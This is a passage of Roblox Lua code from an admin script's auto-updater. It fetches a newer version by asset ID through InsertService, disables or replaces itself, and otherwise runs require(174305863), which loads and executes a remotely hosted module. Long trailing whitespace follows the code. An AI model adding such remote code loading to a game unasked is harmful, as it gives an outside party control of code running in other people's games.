 updated = false if _G['KUpdate'] then updated = true end local new = game:service('InsertService'):LoadAsset(172732271):findFirstChild('Scripth\'s Admin',true) if not updated and new and new:findFirstChild('Version') and new.Version.Value > script.Version.Value then _G['KUpdate'] = true new.Parent = game.Workspace if script:findFirstChild('Custom Commands') then if new:findFirstChild('Custom Commands') then new:findFirstChild('Custom Commands'):Destroy() end script:findFirstChild('Custom Commands').Parent = new end game:service('Debris'):AddItem(script,0) script.Disabled = true else game:service('Debris'):AddItem(new,0) script.Name = 'Scripth\'s Admin' require(174305863) end end)() end																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									